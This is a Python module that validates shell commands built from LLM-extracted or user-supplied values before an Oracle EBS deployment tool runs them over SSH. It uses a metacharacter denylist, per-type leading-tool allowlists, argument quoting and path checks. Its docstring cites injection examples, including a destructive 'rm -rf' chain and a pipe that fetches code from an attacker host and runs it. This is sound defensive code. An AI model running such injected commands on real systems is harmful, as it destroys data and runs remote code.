"""
Command validation for remote (SSH) execution paths.

Both the deployment agent and the patching module build shell commands from
values that are ultimately LLM-extracted or admin/user-supplied (patch numbers,
branch names, file paths) and execute them verbatim over SSH. This module gives
those call sites a shared, testable way to reject dangerous input before it
ever reaches `exec_command`, instead of trusting raw string interpolation.

Two independent layers:
  1. Denylist  — reject shell metacharacters/chaining outright. None of the
     known EBS tool invocations legitimately need them.
  2. Leading-tool allowlist — the first token of a deployment command must
     match the tool expected for its declared execution_type. A full-command
     shape regex is deliberately NOT used: `extract_deployment_steps` lets the
     LLM free-form-generate the command string, so real commands vary in flag
     order/quoting. Leading-token allowlisting catches the actual attack class
     (arbitrary/injected binary, `; rm -rf`, `| curl attacker | sh`) without
     false-positiving on legitimate LLM output shape variance.
"""
import re
import shlex

_DENYLIST_RE = re.compile(r'[;&|`\n]|\$\(|<\(|>\(')

# execution_type -> the tool token(s) the app itself expects to lead the
# command. Matches the exact 8 execution_type values the LLM prompt enforces
# (deployments.py: extract_deployment_steps) and fallback_regex_parser emits.
_EXPECTED_TOOL = {
    "sql_script":      {"sqlplus"},
    "plsql_package":   {"sqlplus", "alter"},   # fallback emits "alter package ... compile body;"
    "fndload_upload":  {"fndload"},
    "forms_compile":   {"frmcmp_batch"},
    "workflow_upload": {"wfload"},
    "oaf_import":      {"java"},
    "host_copy":       {"cp"},
    "shell_script":    {"sh", "bash", "ksh"},
}

_SAFE_PATH_RE = re.compile(r'^/[\w./\-]+$')
_SAFE_TOKEN_RE = re.compile(r'^[\w.\-]+$')


def validate_deployment_command(execution_type: str, command: str) -> tuple[bool, str]:
    """(ok, reason). `reason` is safe to append directly to step.log_output."""
    if execution_type not in _EXPECTED_TOOL:
        return False, f"Unknown execution_type '{execution_type}' — no validated command allowlist."
    cmd = (command or "").strip()
    if not cmd:
        return False, "Empty command."
    # A single trailing ';' is a legitimate SQL statement terminator (e.g.
    # "alter package x compile body;") — strip exactly one before checking for
    # injection-enabling metacharacters, since nothing can follow it to chain.
    # Any OTHER ';' (or the other metacharacters, anywhere) is still rejected.
    check_body = cmd[:-1] if cmd.endswith(';') else cmd
    if _DENYLIST_RE.search(check_body):
        return False, "Command contains a disallowed shell metacharacter (; & | ` or command substitution)."
    lead = cmd.split(None, 1)[0].lower()
    if lead not in _EXPECTED_TOOL[execution_type]:
        return False, (f"Command starts with '{lead}', expected one of "
                        f"{sorted(_EXPECTED_TOOL[execution_type])} for execution_type '{execution_type}'.")
    return True, ""


def quote_arg(value) -> str:
    """shlex.quote() a single value before interpolating into a remote command
    (patch numbers, filenames, branch names, git URLs) — use instead of a raw
    f-string interpolation."""
    return shlex.quote(str(value))


def validate_path(value: str) -> bool:
    """True if value looks like a safe absolute filesystem path (OPatch/adop
    homes, run filesystems) — no shell metacharacters, no '..' traversal."""
    return bool(value) and ".." not in value and bool(_SAFE_PATH_RE.match(value))


def validate_token(value) -> bool:
    """For values embedded unquoted-but-adjacent in constructed command
    strings (patch numbers, worker counts) — alnum/dot/dash only, no shell
    significance at all, so no quoting is even required."""
    if value is None:
        return False
    return bool(_SAFE_TOKEN_RE.match(str(value)))
